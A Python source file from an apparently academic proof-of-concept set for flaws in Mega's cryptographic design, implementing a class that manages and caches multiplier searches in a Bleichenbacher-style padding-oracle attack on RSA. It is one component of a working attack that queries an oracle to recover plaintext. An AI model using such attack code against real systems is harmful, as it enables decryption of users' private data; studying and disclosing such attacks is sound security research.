
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: Implementation of a manger class for the multipliers (called s) used
# during our Bleichenbacher-style attacks. It maintains a data structure of
# already queried values and thereby avoids repeated queries due to wrong prefix
# guesses.
#

import bisect
import sys

from issue_05.utils.interval import *
from shared.attack_utils import *

class SManager:
    """
    This class maintains a list of intervals which have already been searched for
    conforming s values. It can be queried to find the next s value. If it is
    not already stored, it will be calculated.

    self.dp: a sorted list of searched intervals, each interval contains at most
        one valid s value (the upper bound)
    self.dp_low: contains all lower bounds (for binary search, update to use
        key= kw of bisect_left with Python 3.10)
    self.cache: a local cache for queried s values, the upper bound fo self.dp is always in the cache.
    """
    def __init__(self, s_min, B, lower, upper, n, ct):
        self.ct = ct
        self.B = B
        self.lower = lower
        self.upper = upper
        self.n = n
        self.dp = [Interval(0, s_min)]
        self.dp_low = [0]
        self.cache = { s_min: self.ct.test_s(s_min) }

    def __str__(self):
        return ", ".join(map(str, self.dp))

    def merge_right(self, idx):
        """
        Check whether the interval at index idx can be merged with the next larger
        interval, i.e., if we have
            idx: [a,b], idx+1: [c,d]
        we create:
            idx: [a,d] if b >= c-1

        :returns s: the next s value to continue from the interval at index idx
        """
        if idx + 1 < len(self.dp) and self.dp[idx].b >= self.dp[idx + 1].a - 1:
            self.dp[idx].b = self.dp[idx + 1].b

            del self.dp[idx+1]
            del self.dp_low[idx+1]

        return self.dp[idx].b

    def insert_interval(self, interv):
        """
        We only handle the following inserts of [a,b] for the next interval [c, d]:
            - merge: a <= b = c <= d
            - insert: a <= b < c <= d

        :param iterv: interval to insert
        :return: idx of next interval and the max s value of the current interval
        """
        assert len(self.dp) > 0

        idx = self.find_interval_idx(interv.a)

        if idx > 0 and 0 <= self.dp[idx-1].b - interv.a <= 1:
            # merge (both) -> remove one interval
            if idx < len(self.dp) and interv.b >= self.dp[idx].a - 1:
                self.dp[idx-1].b = self.dp[idx].b
                del self.dp[idx]
                del self.dp_low[idx]
            # merge (left)
            else:
                self.dp[idx-1].b = interv.b
            return idx, self.dp[idx-1].b
        else:
            # merge (right)
            if idx < len(self.dp) and interv.b >= self.dp[idx].a - 1:
                self.dp[idx].a = interv.a
                self.dp_low[idx] = interv.a
            # insert
            else:
                self.dp = self.dp[:idx] + [interv] + self.dp[idx:]
                self.dp_low = self.dp_low[:idx] + [interv.a] + self.dp_low[idx:]
            return idx + 1, self.dp[idx].b

    def access_cache_and_test(self, s):
        if s not in self.cache:
            self.cache[s] = self.ct.test_s(s)
        return self.cache[s]

    def s_iterator(self, s_start, s_end=None):
        """
        Iterate through s values in [s_start, s_end) but skip already calculated values.

        :param s_start: starting value for s
        :param s_end: stop before this value

        :yield: next s value to test and s_start if the value is not already in an interval
        """

        next_idx, s_start = self.insert_interval(Interval(s_start, s_start))

        # Attention: the indices can change, since other iterators might be added later
        # and operate in parallel. Thus, we directly manipulate references to the
        # current and next interval. This assumes that the iterators operate far
        # enough from each other to not change the same intervals.
        curr_interval = self.dp[next_idx - 1]
        while True:
            next_interval = self.dp[next_idx] if next_idx < len(self.dp) else None

            if self.access_cache_and_test(s_start):
                yield s_start

            s = s_start + 1
            while (not s_end or s < s_end) and (not next_interval or s < next_interval.a):
                curr_interval.b = s
                yield s
                s += 1

            curr_idx = self.find_interval_idx(curr_interval.b)
            next_idx = curr_idx + 1
            s_start = self.merge_right(curr_idx)

            if s_end and (s >= s_end or s_start >= s_end):
                # No s found in [s_start, s_end]
                break
            # Otherwise, continue searching after the next interval (s_start was
            # updated by merge_right to skip already searched interval).

    def process_s(self, s):
        """
        Process s value and add a new interval when we found a new s value outside
        of existing intervals.

        :param s: s value to query
        :returns s: True if the s value is not successful.
        """

        if (s in self.cache and self.cache[s]) or self.ct.test_s(s):
            self.cache[s] = True
            return True
        return False

    def search_next_s_iteratively(self, s_start, s_end=None):
        """
        Find the next s in [s_start, s_end) and skip already calculated s values.

        :param s_start: starting value for s
        :param s_end: stop before this value
        :return: next s value
        """

        for s in self.s_iterator(s_start, s_end):
            if self.process_s(s):
                return s

        # No s value found
        return None

    def find_interval_idx(self, s):
        """
        Find the index of the interval [a,b] such that a <= s < b if s is
        contained in an interval and otherwise s < a for the smallest a (i.e.,
        the index of the next interval).
        """

        idx = bisect.bisect_left(self.dp_low, s)

        if idx > 0 and s in self.dp[idx-1]:
            return idx - 1
        return idx

    def find_next_s(self, s, s_end=None):
        """
        Find the next s in [s_start, s_end) value, where we leverage already
        searched regions via dynamic programming

        :param s: start value
        :param s_end: end value (optional)
        :return: next s value
        """
        assert s >= 0

        idx = self.find_interval_idx(s)

        # Case: interval [s_min, s_max] with s_min <= s <= s_max -> start search with s_max
        if idx < len(self.dp) and s in self.dp[idx]:
            return self.search_next_s_iteratively(self.dp[idx-1].b, s_end)
        # Case: s > last interval --> add new interval [s, s_end]
        # Case: s < s_min for next interval [s_min, s_max], but there is no interval overlapping with [s, s_min)
        assert(s > self.dp[-1].b or (self.dp[idx-1].b < s < self.dp[idx].a))
        return self.search_next_s_iteratively(s, s_end)

    def find_next_s_interval(self, s_old, bound):
        """
        Find the next s value for m in [a, b] -> use Bleichenbacher's s search to half the interval.

        :param s_old: last s value
        :param bound: interval [a, b] for plaintext
        :return: next s value
        """
        a, b = bound.a, bound.b

        r_cnt = 0
        while True:
            print("+", end="")
            sys.stdout.flush()

            cnt = 0
            for q in self.ct.possible_prefixes:
                y = (q * self.B) << 16
                r = max(0, ceil_int_div(2 * b * s_old - self.lower - y, self.n)) + r_cnt

                s_min = ceil_int_div(self.lower + r * self.n + y, b)
                s_max = ceil_int_div(self.upper + r * self.n + y, a)

                for s in self.s_iterator(s_min, s_max):
                    if self.process_s(s):
                        print()
                        if s_max < ceil_int_div(self.lower + (r + 1) * self.n + y, b):
                            self.insert_interval(Interval(s_max, ceil_int_div(self.lower + (r + 1) * self.n + y, b)))
                        return s

                    if cnt % 1000 == 0:
                        print("_", end="")
                        sys.stdout.flush()
                    cnt += 1

            r_cnt += 1
